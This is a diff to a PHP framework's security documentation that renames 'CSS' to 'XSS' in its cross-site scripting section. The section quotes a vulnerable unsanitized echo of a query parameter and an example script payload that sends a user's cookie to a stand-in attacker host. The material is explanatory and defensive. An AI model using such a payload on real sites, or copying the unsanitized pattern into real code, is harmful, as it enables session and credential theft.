@@ -14,9 +14,9 @@
 5. [Encryption](#encryption)
   1. [What is It?](#encryption-what-is-it)
   2. [How to Use It](#encryption-how-to-use-it)
-6. [Cross-Site Scripting (CSS)](#cross-site-scripting)
-  1. [What is It?](#css-what-is-it)
-  2. [How to Defend Against It](#css-how-to-defend-against-it)
+6. [Cross-Site Scripting (XSS)](#cross-site-scripting)
+  1. [What is It?](#xss-what-is-it)
+  2. [How to Defend Against It](#xss-how-to-defend-against-it)
 7. [Cross-Site Request Forgery (CSRF/XSRF)](#cross-site-request-forgery)
   1. [What is It?](#csrf-what-is-it)
   2. [How to Defend Against It](#csrf-how-to-defend-against-it)
@@ -53,15 +53,15 @@ Encryption is the process of encoding data with a special key so that only autho
 <h4 id="encryption-how-to-use-it">How to Use It</h4>
 Learn how to [encrypt data](cryptography#encryption) in Opulence.
 
-<h2 id="cross-site-scripting">Cross-Site Scripting (CSS)</h2>
-<h4 id="css-what-is-it">What is It?</h4>
+<h2 id="cross-site-scripting">Cross-Site Scripting (XSS)</h2>
+<h4 id="xss-what-is-it">What is It?</h4>
 Cross-site scripting involves the injection of client-side scripts into your pages.  A common vulnerability is displaying unsanitized user input to your page:
 
 ```php
 Hello, <?php echo $_GET["name"]; ?>
 ```
 
-A malicious user could send an unsuspecting user a hyperlink with a CSS injection in the URL:  `http://your-site.com/?name=<script>(new Image).src="http://attacker-site.com/" + $.cookie("user-password")</script>`.  Clicking on the link would take the user to your page, which would display:
+A malicious user could send an unsuspecting user a hyperlink with a XSS injection in the URL:  `http://your-site.com/?name=<script>(new Image).src="http://attacker-site.com/" + $.cookie("user-password")</script>`.  Clicking on the link would take the user to your page, which would display:
 
 ```
 Hello, <script>(new Image).src="http://attacker-site.com/" + $.cookie("user-password")</script>
@@ -69,7 +69,7 @@ Hello, <script>(new Image).src="http://attacker-site.com/" + $.cookie("user-pass
 
 Loading this page would send the user's "user-password" cookie to the attacker's server.
 
-<h4 id="css-how-to-defend-against-it">How to Defend Against It</h4>
+<h4 id="xss-how-to-defend-against-it">How to Defend Against It</h4>
 To solve this problem you must sanitize any user-input before displaying it on a page.  [Opulence's template system](view-fortune#sanitized-tags) gives you the tools to prevent cross-site scripting.
 
 <h2 id="cross-site-request-forgery">Cross-Site Request Forgery (CSRF/XSRF)</h2>
